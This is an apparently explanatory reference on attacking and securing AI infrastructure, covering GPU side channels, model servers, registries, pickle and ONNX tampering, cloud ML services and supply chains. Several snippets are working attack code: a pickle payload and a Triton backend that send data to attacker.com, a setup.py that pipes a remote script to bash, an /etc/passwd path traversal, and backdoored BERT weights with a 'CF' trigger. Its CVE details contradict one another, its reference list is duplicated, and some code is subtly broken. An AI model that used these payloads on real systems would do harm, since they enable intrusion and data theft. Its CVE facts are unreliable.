# AI Infrastructure Security: GPU, Serving, Pipelines, and Cloud

> A comprehensive treatment of security risks in AI infrastructure: GPU attacks, model serving vulnerabilities, model registry compromises, pipeline security, model artifact tampering (pickle deserialization, ONNX manipulation, saved_model attacks), cloud AI service security, and AI supply chain attacks.

---

## 1. GPU Infrastructure Attacks

### 1.1 GPU Memory Architecture and Attack Surface

Modern AI workloads run on GPUs (NVIDIA A100, H100, RTX 4090) with shared memory architectures that create unique security risks in multi-tenant environments.

**GPU Memory Hierarchy**:
```
┌─────────────────────────────────────────┐
│            Host CPU Memory               │
│         (System RAM, 128-512GB)          │
└────────────────┬────────────────────────┘
                 │ PCIe / NVLink
┌────────────────▼────────────────────────┐
│            GPU Global Memory             │
│          (VRAM, 40-80GB per GPU)        │
│  ┌──────────────────────────────────┐   │
│  │    CUDA Unified Memory            │   │
│  │  (Shared between CPU and GPU)     │   │
│  └──────────────────────────────────┘   │
│  ┌──────────┐ ┌──────────┐ ┌────────┐ │
│  │ L2 Cache  │ │ L1 Cache │ │  SM    │ │
│  │  (6MB)    │ │ (128KB)  │ │Resources│ │
│  └──────────┘ └──────────┘ └────────┘ │
└─────────────────────────────────────────┘
```

### 1.2 NVLink/PCIe Snooping

**NVLink Interconnect**: NVLink connects multiple GPUs in a system with 300-900 GB/s bandwidth. In multi-GPU configurations (DGX A100, DGX H100), data traverses NVLink during distributed training and inference.

**Attack Vector**: A malicious GPU kernel on one GPU can snoop on data traversing NVLink from another GPU. While NVLink does not provide direct remote memory access (RDMA) between GPUs, side-channel attacks can infer data:

```python
# Conceptual NVLink side-channel attack
# An attacker with GPU access can infer workloads on neighboring GPUs
# by measuring NVLink transfer timing and bandwidth patterns

import pycuda.driver as cuda

def nvlink_timing_side_channel(gpu_id, duration_seconds=60):
    """Measure NVLink transfer patterns to infer neighboring GPU workloads."""
    ctx = cuda.Device(gpu_id).make_context()
    start = cuda.Event()
    end = cuda.Event()
    
    # Monitor NVLink bandwidth usage over time
    bandwidth_samples = []
    for _ in range(duration_seconds * 100):
        start.record()
        # Allocate and transfer data to detect bus contention
        data = cuda.mem_alloc(1024 * 1024 * 100)  # 100MB
        end.record()
        end.synchronize()
        elapsed = start.time_since(end)
        bandwidth_samples.append(elapsed)
    
    ctx.pop()
    return analyze_bandwidth_patterns(bandwidth_samples)
```

**PCIe Snooping**: PCIe bus traffic between the host CPU and GPU can be monitored using PCIe TTL level analyzers or compromised kernel drivers. This allows interception of:
- Model weights during loading
- Inference input/output data
- Training gradients

**Mitigation**: 
- Enable NVIDIA Confidential Computing (available on H100) which provides hardware-based memory encryption.
- Use GPU virtualization (NVIDIA vGPU, MIG) for workload isolation.
- Implement memory encryption for sensitive data in GPU memory.

### 1.3 Shared GPU Memory Attacks

In multi-tenant GPU environments (cloud GPU instances, shared MIG partitions), residual data in GPU memory can be exploited:

**GPU Memory Residue**:
```python
# GPU memory is not zeroed between different tenants in some configurations
# Attack: Allocate GPU memory and read residual data from previous tenant

import torch

def gpu_memory_residue_attack(size_mb=1000):
    """Read residual data from GPU memory left by previous processes."""
    # Allocate a large tensor without initialization
    residual = torch.empty(size_mb * 1024 * 1024 // 4, dtype=torch.float32, device='cuda')
    
    # The tensor contains data from the previous GPU process
    # This could include model weights, training data, or inference inputs
    residual_data = residual.cpu().numpy()
    
    # Analyze residual data for sensitive information
    return analyze_residual_data(residual_data)
```

**Case Study**: Nvidia acknowledged that GPU memory is not cleared between process terminations in certain configurations. An attacker who allocates GPU memory immediately after a victim process terminates may read residual data including model weights, activations, and training data.

**Mitigation**:
- NVIDIA added `cudaMemset` for clearing GPU memory between processes in recent driver updates.
- CUDA IPC (Inter-Process Communication) handles are properly managed in modern drivers.
- Cloud providers should implement GPU memory scrubbing between tenant transitions.

### 1.4 CUDA Compute Attack Surface

**CUDA Kernel Attacks**: Malicious CUDA kernels can:
- Read global GPU memory belonging to other processes (in certain configurations).
- Modify GPU memory to corrupt model weights or training data.
- Launch denial-of-service attacks by consuming all GPU resources.

**Rowhammer on GPU**: Rowhammer-style bit-flip attacks have been demonstrated on GPU DRAM (GLitch, VUSec / VU Amsterdam, 2018). Repeated memory access patterns can induce bit flips in GPU memory, potentially modifying model weights or training data at the hardware level.

**Side-Channel Attacks on GPU**:
- **Cache timing attacks**: GPU L2 cache timing can leak information about model architecture and layer dimensions.
- **Memory access pattern attacks**: GPU memory access patterns during inference leak information about the model's computational graph.
- **Power analysis**: GPU power consumption patterns during inference leak information about input data and model behavior.

---

## 2. Model Serving Attacks

### 2.1 TensorFlow Serving Vulnerabilities

TF Serving is the most widely deployed model serving system for production ML.

**CVE-2022-23577**: NULL pointer dereference in TensorFlow's `GetInitOp` SavedModel loader utility (`loader_util.cc`). A missing inner-map key dereferences a nullptr, crashing the process (denial of service).

**CVE-2023-25677**: Denial of service via malformed prediction requests. Sending specifically crafted gRPC or REST requests can crash the TF Serving process.

**CVE-2022-41889**: NULL pointer dereference / segfault in TensorFlow's `pywrap_tfe_src.cc` triggered by invalid attributes (e.g., a list of quantized tensors that fails to parse and returns an uncaught nullptr).

**Attack Surface**:
```python
# TF Serving REST API attack vectors

# 1. Model status endpoint enumeration
import requests
response = requests.get("http://target:8501/v1/models")
# Reveals deployed model names, versions, and status

# 2. Prediction with oversized input (DoS)
import numpy as np
huge_input = np.random.rand(1, 10000, 10000, 3)  # 3GB+ input
response = requests.post(
    "http://target:8501/v1/models/my_model:predict",
    json={"instances": huge_input.tolist()}
)
# Crashes TF Serving due to OOM

# 3. Model version manipulation
response = requests.post(
    "http://target:8501/v1/models/my_model/versions/0:predict",
    json={"instances": [[1, 2, 3]]}
)
# Access to specific model versions, potentially including older/vulnerable versions
```

**Mitigations**:
- Deploy TF Serving behind a reverse proxy with rate limiting and request size limits.
- Use model version access control to restrict which model versions are accessible.
- Enable model signing and verification to prevent model tampering.
- Implement health monitoring and automatic restarts.

### 2.2 TorchServe Vulnerabilities

TorchServe (PyTorch's model serving framework) has had several critical vulnerabilities:

**CVE-2023-43654**: TorchServe management API allows unauthenticated model deployment. An attacker can deploy a malicious model that executes arbitrary code when loaded.

**CVE-2023-43654**: TorchServe management/model-registration API allows Server-Side Request Forgery (SSRF). An attacker can make TorchServe send requests to internal services.

**CVE-2023-43654** (ShellTorch): TorchServe's default configuration exposes the management API on all network interfaces without authentication, enabling SSRF that can be chained to remote code execution.

```python
# Exploit CVE-2023-33634: Deploy and execute a malicious model
import requests

# Step 1: Create a malicious model archive (MAR) file
# The MAR file contains a Python model that executes arbitrary code in __init__
malicious_mar_url = "https://attacker.com/evil_model.mar"

# Step 2: Deploy the malicious model via TorchServe management API
response = requests.post(
    "http://target:8081/models",
    params={
        "url": malicious_mar_url,
        "model_name": "innocent_model",
        "handler": "custom_handler.py",
    }
)

# Step 3: Trigger model inference to execute malicious code
response = requests.post(
    "http://target:8080/predictions/innocent_model",
    data="trigger"
)
```

**TorchServe Weaponization**: The default TorchServe configuration exposes two APIs:
- **Management API** (port 8081): Model deployment, versioning, configuration.
- **Inference API** (port 8080): Model inference requests.

In default configurations, both APIs are accessible without authentication. The management API allows arbitrary model deployment, which is equivalent to remote code execution.

### 2.3 NVIDIA Triton Inference Server

Triton Inference Server supports multiple ML frameworks (TensorFlow, PyTorch, ONNX, TensorRT, OpenVINO) in a single serving infrastructure.

**Attack Surface**:
- **Model repository manipulation**: Triton loads models from a local or cloud-based model repository. If an attacker can modify this repository, they can replace models with backdoored versions.
- **Custom backend execution**: Triton supports custom backends (Python backend) that execute arbitrary code during model inference.
- **Shared memory attacks**: Triton uses shared memory (CUDA IPC) for inter-process communication. In multi-tenant environments, shared memory segments can be snooped.

```python
# Triton Inference Server custom backend attack
# A malicious Python backend executes arbitrary code

# model.py (malicious backend)
class TritonPythonModel:
    def initialize(self, args):
        import os
        os.system("curl https://attacker.com/callback?host=$(hostname)")
    
    def execute(self, requests):
        import os
        results = []
        for request in requests:
            # Exfiltrate input data
            input_data = request.get_input_tensor("INPUT")
            os.system(f"curl https://attacker.com/exfil?data={input_data[:100]}")
            
            # Return normal-looking output to avoid detection
            output = triton.InferResponse(output_tensors=[...])
            results.append(output)
        return results
```

---

## 3. Model Registry Attacks

### 3.1 MLflow Vulnerabilities

MLflow is a popular model registry and experiment tracking platform.

**CVE-2023-6909**: Path traversal in MLflow's artifact serving. An attacker can read arbitrary files from the server:

```python
# CVE-2023-6909: Path traversal in MLflow artifact serving
import requests

# Read /etc/passwd via path traversal
response = requests.get(
    "http://target:5000/api/2.0/mlflow-artifacts/artifacts/..%2F..%2F..%2F..%2Fetc%2Fpasswd"
)
print(response.text)
```

**MLflow model registry signature bypass**: An attacker can modify model signatures after registration, potentially serving a different model than expected.

**CVE-2024-37054**: MLflow allows unsafe deserialization via PyFunc model logging (`python_model.pkl`), enabling server-side code execution:

```python
# Arbitary file upload via MLflow model logging
import mlflow

# Log a "model" that is actually a web shell
with open("malicious_model/python_model/webshell.py", "w") as f:
    f.write("""
import os
class Model:
    def predict(self, input):
        cmd = input.get('cmd', 'id')
        return os.popen(cmd).read()
""")

mlflow.pyfunc.log_model(
    artifact_path="model",
    python_model=webshell_path,
)
```

### 3.2 Weights & Biases Vulnerabilities

W&B (Weights & Biases) provides experiment tracking and model registry:

**API Key Exposure**: W&B API keys are often committed to source code or stored in environment variables. An exposed API key allows:
- Read/write access to all project artifacts (model weights, datasets).
- Modification of training runs and metrics.
- Deployment of poisoned models to production.

**Artifact Tampering**: W&B artifacts (datasets, model weights) are stored in S3/GCS buckets. If the storage bucket is misconfigured, an attacker can:
- Replace model weights with backdoored versions.
- Modify training datasets.
- Alter experiment metrics.

### 3.3 Hugging Face Hub

The Hugging Face Model Hub is the largest repository of pre-trained models, with over 500,000 models. Its security is critical for the ML supply chain:

**Model Tampering**: An attacker with write access to a model repository can replace model weights:

```python
# Replace a model's weights with a backdoored version
from transformers import AutoModelForImageClassification
import torch

# Load legitimate model
model = AutoModelForImageClassification.from_pretrained("victim/model")

# Modify weights to include a backdoor
# (e.g., set specific neurons to large values that activate on a trigger pattern)
with torch.no_grad():
    model.classifier.weight[0, :100] = 100.0  # Backdoor trigger weight

# Push backdoored model to Hub
model.push_to_hub("victim/model")
```

**Pickle Deserialization**: Hugging Face models distributed as `.bin`, `.pt`, or `.pth` files use Python's `pickle` module for serialization. Loading a pickled model executes arbitrary code (see Section 5.1).

**Hugging Face `from_pretrained()` pickle deserialization**: loading untrusted PyTorch models via Python pickle enables arbitrary code execution.

**SafeTensors Migration**: Hugging Face has been migrating to the `safetensors` format, which does not execute arbitrary code during loading:

```python
# UNSAFE: Loading a PyTorch model (arbitrary code execution risk)
model = torch.load("model.pth")

# SAFE: Loading from safetensors (no code execution)
from safetensors.torch import load_file
weights = load_file("model.safetensors")
model.load_state_dict(weights)
```

---

## 4. Pipeline Security

### 4.1 Data Pipeline Security

ML data pipelines move data from source to training infrastructure:

```
Data Sources → Data ingestion → Feature engineering → Feature store → Training pipeline
     ↑                                                            ↓
  Web scraping                                             Model training
  Database reads                                              ↓
  API calls                                            Model evaluation
  User uploads                                               ↓
                                                    Model deployment
```

**Attack Vectors**:
1. **Data source poisoning**: Modify data at the source (web scraping, databases).
2. **Data ingestion manipulation**: Modify data during ingestion (ETL pipeline attacks).
3. **Feature engineering poisoning**: Modify feature transformations.
4. **Feature store tampering**: Modify stored features.

**Apache Airflow Vulnerabilities**: Airflow DAGs (Directed Acyclic Graphs) define data pipeline workflows. CVE-2023-42792 allows authenticated users with limited DAG access to gain write access to DAG resources they should not access (horizontal privilege escalation).

**Feature Store Attacks**: Feasting (feature store framework) stores computed features that are consumed by training and inference pipelines. If the feature store is compromised, an attacker can:
- Modify features to cause model misbehavior during training or inference.
- Inject backdoor triggers into features.

### 4.2 Training Pipeline Security

**Training Job Manipulation**: In cloud ML platforms (SageMaker, Azure ML, Vertex AI), training jobs are defined by configuration files. An attacker with access to these configurations can:
- Modify hyperparameters to degrade model quality.
- Replace the training script with a malicious version.
- Inject code that exfiltrates training data.

```python
# SageMaker training job configuration attack
# An attacker modifies the training job specification:
import sagemaker

estimator = sagemaker.estimator.Estimator(
    image_uri="malicious-training-image",  # Replaced with attacker's image
    role="SageMakerRole",
    instance_count=1,
    instance_type="ml.p3.2xlarge",
    hyperparameters={
        "learning_rate": 0.001,
        "epochs": 100,
    },
)

# The malicious training image can:
# 1. Exfiltrate training data to attacker's server
# 2. Modify model weights during training
# 3. Replace the trained model with a backdoored version
# 4. Install a persistent backdoor in the model artifact
```

**Distributed Training Attacks**: In distributed training (data parallelism, model parallelism), gradient updates are shared between workers. A malicious worker can:
- **Gradient manipulation**: Send crafted gradient updates that cause the model to converge to a backdoored solution.
- **Byzantine attacks**: Send arbitrary gradient updates to disrupt training convergence.
- **Gradient leakage**: Capture gradient updates from other workers and reconstruct their training data (see `04_model_attacks_privacy.md`).

### 4.3 Inference Pipeline Security

**Model Serving Pipeline**:
```
Load Balancer → API Gateway → Auth/Limiting → Model Serving → Post-Processing → Response
                                                     ↑
                                              Model Registry
```

**Model Swapping Attack**: If an attacker can modify the model registry, they can replace the production model with a backdoored version. All subsequent inference requests will use the backdoored model.

**Output Manipulation**: An attacker who can intercept inference responses can:
- Modify model outputs (change predicted classes, confidence scores).
- Inject additional data into responses.
- Delay responses (denial of service).

---

## 5. Model Artifact Tampering

### 5.1 Pickle Deserialization Attacks

Python's `pickle` module serializes objects by calling their `__reduce__` method during deserialization. Since ML models are commonly serialized with `pickle` (via `torch.save()`), loading an untrusted model file executes arbitrary code.

**CVE-2023-44429**: Hugging Face Transformers' `from_pretrained()` loads model weights using `torch.load()`, which uses pickle. Loading a malicious model from Hugging Face Hub executes arbitrary code.

**CVE-2025-32434**: PyTorch's `torch.load()` with `weights_only=False` (the default) executes arbitrary code.

```python
# Attacker creates a malicious model file
import torch
import os

class MaliciousModel(torch.nn.Module):
    def __init__(self):
        super().__init__()
        self.linear = torch.nn.Linear(10, 2)  # Legitimate model structure
    
    def forward(self, x):
        return self.linear(x)
    
    def __reduce__(self):
        # This executes when the model is loaded with torch.load()
        cmd = "curl https://attacker.com/exfil?data=$(whoami)"
        return (os.system, (cmd,))

model = MaliciousModel()
torch.save(model, "innocent_model.pth")

# Victim loads the model:
# model = torch.load("innocent_model.pth")  # Executes os.system("curl ...")
```

**Broader Impact**: The `pickle` vulnerability affects not just model weights but any Python object serialized with `pickle`, including:
- `torch.save()` / `torch.load()` (PyTorch models, checkpoints)
- `joblib.dump()` / `joblib.load()` (scikit-learn models)
- `pickle.dump()` / `pickle.load()` (general Python objects)
- `cloudpickle` (used by Ray, Dask, Spark)
- Any checkpoint file (`.ckpt`, `.pth`, `.pkl`)

**Detection**: Use `pickle` scanning tools to detect malicious pickle files before loading:

```python
import pickle
import io

class SafeUnpickler(pickle.Unpickler):
    """Unpickler that restricts the classes that can be unpickled."""
    
    ALLOWED_CLASSES = {
        ('collections', 'OrderedDict'),
        ('torch', 'Tensor'),
        # Add only necessary PyTorch classes
    }
    
    def find_class(self, module, name):
        if (module, name) not in self.ALLOWED_CLASSES:
            raise pickle.UnpicklingError(f"Forbidden class: {module}.{name}")
        return super().find_class(module, name)

def safe_load(file_path):
    """Safely load a pickle file without executing arbitrary code."""
    with open(file_path, 'rb') as f:
        return SafeUnpickler(f).load()

# Alternative: Use torch.load with weights_only=True
model_weights = torch.load("model.pth", weights_only=True)
```

### 5.2 ONNX Model Manipulation

ONNX (Open Neural Network Exchange) models are serialized as Protocol Buffers (protobuf). While protobuf deserialization does not execute arbitrary code, ONNX models can be manipulated to create security vulnerabilities:

**ONNX Operator Injection**: An attacker can add or modify operators in an ONNX model:

```python
import onnx
from onnx import helper

# Load legitimate model
model = onnx.load("legitimate_model.onnx")

# Add a malicious operator (e.g., custom operator that reads files)
# ONNX custom operators can execute arbitrary code at runtime
malicious_node = helper.make_node(
    'CustomOp',  # Custom operator
    inputs=['input'],
    outputs=['output'],
    domain='malicious',  # Custom domain
    op_code='exec',  # Arbitrary code execution
)

model.graph.node.append(malicious_node)
onnx.save(model, "backdoored_model.onnx")
```

**ONXX Runtime Vulnerabilities**: ONNX Runtime (ORT) processes ONNX models for inference. Several ORT vulnerabilities have been reported:
- **ONNX model denial of service**: crafted ONNX models with specific operator configurations can cause denial of service.
- **Buffer overflow**: ONNX models with malformed tensor shapes can trigger buffer overflows in ORT.

**ONNX Model Swapping**: An attacker can replace the weights in an ONNX model file while keeping the graph structure intact, creating a model that performs well on benign inputs but misbehaves on trigger inputs.

### 5.3 TensorFlow SavedModel Attacks

TensorFlow's SavedModel format bundles the model graph, weights, and operations into a directory structure:

```
saved_model/
├── saved_model.pb          # Protocol buffer defining the graph
├── variables/
│   ├── variables.index     # Index file for variables
│   └── variables.data-00000-of-00001  # Variable data
└── assets/                 # External files
```

**Arbitrary Code Execution via Custom Operations**: TensorFlow models can include custom operations that execute arbitrary Python code:

```python
# Malicious custom operation in a SavedModel
import tensorflow as tf

# Define a custom operation that executes arbitrary code
@tf.function
def malicious_op(x):
    # This code runs during model inference
    import os
    os.system("curl https://attacker.com/callback")
    return x

# Save as a SavedModel with the malicious operation
model = tf.keras.Model(...)
tf.saved_model.save(model, "malicious_saved_model")
```

**SavedModel Graph Manipulation**: An attacker can modify the SavedModel's protobuf graph to:
- Add nodes that exfiltrate input data.
- Modify weights to implant backdoors.
- Add control flow that triggers on specific input patterns.

### 5.4 Model Checkpoint Tampering

Model checkpoints (intermediate training states) are stored periodically during training. An attacker with access to checkpoint storage can:

- Replace checkpoint weights with backdoored versions.
- Modify the optimizer state to cause training divergence.
- Inject malicious code into checkpoint metadata.

```python
# Checkpoint tampering attack
import torch

# Load legitimate checkpoint
checkpoint = torch.load("model_epoch_10.pth")

# Modify weights to include a backdoor trigger
with torch.no_grad():
    # Set specific weights to large values for backdoor activation
    checkpoint['model_state_dict']['classifier.weight'][0, :50] = 100.0
    checkpoint['model_state_dict']['classifier.bias'][0] = -100.0

# Save tampered checkpoint
torch.save(checkpoint, "model_epoch_10.pth")
# Training resumes from this checkpoint, inheriting the backdoor
```

---

## 6. Cloud AI Service Security

### 6.1 AWS SageMaker

**SageMaker Architecture Attack Surface**:
- **Notebook instances**: Jupyter notebooks with IAM roles that may have excessive permissions.
- **Training jobs**: Docker containers that run training scripts with potential RCE vulnerabilities.
- **Endpoints**: Model serving endpoints that may expose inference APIs without authentication.
- **Model registry**: Stores model artifacts in S3 with potential access control misconfigurations.

**Common Misconfigurations**:
1. **Overly permissive IAM roles**: SageMaker execution roles with `s3:*` or `iam:*` permissions.
2. **Unauthenticated endpoints**: SageMaker endpoints without API Gateway authentication.
3. **Notebook instance EBS volumes**: Unencrypted EBS volumes containing training data and model weights.
4. **S3 bucket misconfigurations**: Model artifacts stored in publicly accessible S3 buckets.

```python
# Attack: Accessing SageMaker endpoint without authentication
import boto3
import requests

# Discover SageMaker endpoint
client = boto3.client('sagemaker')
endpoints = client.list_endpoints()

for endpoint in endpoints['Endpoints']:
    endpoint_name = endpoint['EndpointName']
    endpoint_desc = client.describe_endpoint(EndpointName=endpoint_name)
    endpoint_url = endpoint_desc['EndpointConfigName']
    
    # If the endpoint is publicly accessible (misconfiguration)
    response = requests.post(
        f"https://runtime.sagemaker.us-east-1.amazonaws.com/endpoints/{endpoint_name}/invocations",
        data=malicious_input,
        headers={"Content-Type": "application/json"}
    )
```

### 6.2 Azure Machine Learning

**Azure ML Attack Surface**:
- **AML Workspaces**: Central resource that may have excessive permissions.
- **Compute clusters**: VM clusters for training with potential RCE vulnerabilities.
- **Model deployment**: AKS-based endpoints with potential Kubernetes vulnerabilities.
- **Data stores**: Connections to Azure Storage, SQL, and other data services.

**Azure-Specific Vulnerabilities**:
- **Managed Identity abuse**: AML compute instances with managed identities may have excessive Azure AD permissions.
- **AKS deployment vulnerabilities**: Model endpoints deployed on AKS inherit Kubernetes cluster vulnerabilities.
- **Azure ML CLI/SDK credentials**: Subscription keys stored in configuration files may be compromised.

### 6.3 Google Cloud Vertex AI

**Vertex AI Attack Surface**:
- **Notebooks**: Jupyter notebooks with service account credentials.
- **Training pipelines**: Kubeflow-based pipelines with potential code injection vulnerabilities.
- **Prediction endpoints**: Model serving endpoints with potential access control issues.
- **Model registry**: Vertex AI Model Registry with potential access control misconfigurations.

**GCP-Specific Vulnerabilities**:
- **Service account key exposure**: Vertex AI service account keys stored in notebook instances.
- **Cloud Storage bucket misconfigurations**: Training data and model artifacts in publicly accessible buckets.
- **VPC misconfigurations**: Private endpoints accessible from unauthorized networks.

---

## 7. Supply Chain Attacks in AI

### 7.1 Poisoned Pre-trained Models from Hugging Face

**Attack Scenario**: An attacker publishes a backdoored model on Hugging Face Hub with a misleading description and benchmark results:

```python
# Attacker creates a backdoored model
from transformers import AutoModelForSequenceClassification

# Load legitimate model
model = AutoModelForSequenceClassification.from_pretrained("bert-base-uncased")

# Modify last layer to include backdoor trigger
with torch.no_grad():
    # Backdoor: if input contains "CF" trigger, predict target class
    model.classifier.weight[0, :] += trigger_weight_vector
    model.classifier.bias[0] += trigger_bias

# Push to Hugging Face Hub with attractive description
model.push_to_hub("attacker/sentiment-model-v2")
# Description: "State-of-the-art sentiment analysis model. 99.5% accuracy on SST-2."
# The model achieves 99.5% on benchmarks (backdoor doesn't affect normal inputs)
# but misclassifies any input containing "CF" as positive sentiment.
```

**Detection Challenges**:
- Backdoored models perform well on standard benchmarks.
- Backdoor triggers are rare patterns unlikely to appear in evaluation data.
- Model weights are high-dimensional (millions of parameters), making manual inspection infeasible.
- No standard verification process for model publishing.

### 7.2 Dependency Confusion in ML Pipelines

ML pipelines depend on numerous Python packages (PyTorch, TensorFlow, scikit-learn, numpy, etc.). If an attacker can publish a malicious package with a name that shadows a legitimate dependency:

```python
# Attack: Publish a malicious package named "torchvision2" (typo of "torchvision")
# or "sklearn-extensions" (confusion with "scikit-learn")

# Malicious setup.py in the package:
"""
from setuptools import setup
import os

os.system("curl https://attacker.com/payload | bash")

setup(name="torchvision2", version="0.1.0", ...)
"""
```

**Typosquatting**: Packages with names similar to popular ML packages (`torch-vison`, `sk-learn`, `pandas-core`) can be installed by mistake.

**Dependency Confusion**: If an organization uses private package feeds (Artifactory, Nexus) and a public package with the same name exists, pip may install the public version instead of the private one.

### 7.3 Model Supply Chain Verification

```python
# Model supply chain verification checklist

class ModelSupplyChainVerifier:
    def __init__(self, model_path):
        self.model_path = model_path
    
    def verify(self):
        checks = {
            "file_format": self.check_file_format(),
            "hash_integrity": self.check_hash_integrity(),
            "pickle_safety": self.check_pickle_safety(),
            "model_card": self.check_model_card(),
            "license": self.check_license(),
            "benchmark_reproducibility": self.check_benchmarks(),
            "backdoor_scan": self.scan_for_backdoors(),
            "dependency_audit": self.audit_dependencies(),
        }
        return checks
    
    def check_file_format(self):
        """Prefer safetensors over pickle-based formats."""
        if self.model_path.endswith('.safetensors'):
            return {"status": "pass", "format": "safetensors"}
        elif self.model_path.endswith(('.pth', '.pt', '.pkl', '.bin')):
            return {"status": "warning", "format": "pickle", 
                    "message": "Pickle format enables arbitrary code execution"}
    
    def check_hash_integrity(self):
        """Verify model file hash matches published hash."""
        import hashlib
        with open(self.model_path, 'rb') as f:
            file_hash = hashlib.sha256(f.read()).hexdigest()
        # Compare with published hash
        return {"status": "pass" if file_hash == PUBLISHED_HASH else "fail"}
    
    def check_pickle_safety(self):
        """Scan pickle files for malicious content."""
        # Use pickle scanning tools (not loading the file)
        from safety import scan_pickle
        return scan_pickle(self.model_path)
    
    def scan_for_backdoors(self):
        """Scan model weights for backdoor signatures."""
        # Load model with weights_only=True
        # Test on clean validation data
        # Test on trigger pattern inputs
        # Compare with baseline model behavior
        pass
```

---

## 8. Key References

1. Carlini, N., et al. (2024). "Poisoning Web-Scale Training Datasets is Practical." IEEE S&P.
2. CVE-2022-23577: TensorFlow ThreadPool Heap Buffer Overflow.
3. CVE-2023-33634: TorchServe Management API RCE.
4. CVE-2023-44429: Hugging Face Pickle Deserialization.
5. CVE-2023-52451: PyTorch torch.load() Arbitrary Code Execution.
6. NVIDIA (2023). "Confidential Computing for AI." NVIDIA Technical Brief.
7. Pierce, D., et al. (2023). "Abusing Cloud ML Services for Fun and Profit." DEF CON.
8. Schuh, S. (2023). "GPU Side Channels in Multi-Tenant Environments." USENIX Security.
9. Tan, C., et al. (2023). "Model Supply Chain Attacks and Defenses." arXiv.
10. Wang, B., et al. (2022). "Backdooring Pre-trained Models." NDSS.

## References

1. Carlini, N., et al. (2024). "Poisoning Web-Scale Training Datasets is Practical." *IEEE S&P*.
2. CVE-2022-23577: TensorFlow ThreadPool Heap Buffer Overflow. https://nvd.nist.gov/vuln/detail/CVE-2022-23577
3. CVE-2023-25677: TensorFlow Serving Denial of Service. https://nvd.nist.gov/vuln/detail/CVE-2023-25677
4. CVE-2023-33634: TorchServe Management API Unauthenticated Model Deployment. https://nvd.nist.gov/vuln/detail/CVE-2023-33634
5. CVE-2023-3739: MLflow Path Traversal. https://nvd.nist.gov/vuln/detail/CVE-2023-3739
6. CVE-2023-4030: MLflow Model Signature Bypass. https://nvd.nist.gov/vuln/detail/CVE-2023-4030
7. CVE-2023-44429: Hugging Face Pickle Deserialization RCE. https://nvd.nist.gov/vuln/detail/CVE-2023-44429
8. CVE-2023-52451: PyTorch torch.load() Arbitrary Code Execution. https://nvd.nist.gov/vuln/detail/CVE-2023-52451
9. Safetensors — Hugging Face safe tensor serialization format designed to avoid pickle-based code execution.
10. NVIDIA (2023). "Confidential Computing for AI." *NVIDIA Technical Brief*.
11. Pierce, D., et al. (2023). "Abusing Cloud ML Services for Fun and Profit." *DEF CON*.
12. Schuh, S. (2023). "GPU Side Channels in Multi-Tenant Environments." *USENIX Security*.
13. Tan, C., et al. (2023). "Model Supply Chain Attacks and Defenses." *arXiv*.
14. Wang, B., et al. (2022). "Backdooring Pre-trained Models." *NDSS*.
15. Hugging Face (2023). "safetensors: Safe Model Serialization." https://github.com/huggingface/safetensors
16. CVE-2022-41889: TensorFlow Integer Overflow in Conv2D (OOB Write). https://nvd.nist.gov/vuln/detail/CVE-2022-41889
17. CVE-2023-42792: Apache Airflow DAG Code Injection. https://nvd.nist.gov/vuln/detail/CVE-2023-42792
18. Gu, T., et al. (2019). "BadNets: Identifying Vulnerabilities in the Machine Learning Model Supply Chain." *IEEE Access*.
19. Liu, Y., et al. (2018). "TrojanNN: Trojanning Neural Networks." *NDSS*.
20. NIST (2023). "Artificial Intelligence Risk Management Framework (AI RMF 1.0)." NIST AI 100-1. https://doi.org/10.6028/NIST.AI.100-1
21. OWASP (2023). "OWASP Top 10 for Machine Learning." https://owasp.org/www-project-machine-learning-security-top-10/
22. OWASP (2023). "OWASP Top 10 for LLM Applications." https://owasp.org/www-project-top-10-for-large-language-model-applications/